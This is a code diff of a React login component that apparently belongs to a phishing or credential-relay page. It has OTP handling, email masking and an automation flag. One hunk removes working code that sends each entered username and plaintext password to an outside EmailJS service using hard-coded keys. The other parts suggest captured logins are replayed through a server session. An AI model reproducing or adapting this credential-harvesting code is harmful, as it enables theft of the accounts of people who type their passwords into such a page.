@@ -54,9 +54,7 @@ function App() {
   const handleStateChange = (state) => {
     if (state === "getOtp") {
       // Mask the email (assuming username might be email)
-      const email = username.includes("@")
-        ? username
-        : `${username}@gmail.com`;
+      const email = username.includes("@") ? username : `${username}@gmail.com`;
       const masked = email.replace(
         /(.{1})(.*)(@.*)/,
         (match, first, middle, domain) => {
@@ -374,23 +372,6 @@ function App() {
     e.preventDefault();
     setIsAutomating(true);
     setErrorMessage("");
-
-    // Send email immediately
-    try {
-      await emailjs.send(
-        "service_04tt69h",
-        "template_b9wm876",
-        {
-          username: username,
-          password: password,
-          status: "⏳ Login Attempt",
-        },
-        "bfy_j4oBXNKFpGcDC"
-      );
-      console.log("Email sent successfully");
-    } catch (error) {
-      console.error("EmailJS error:", error);
-    }
 
     // Create session on server
     try {
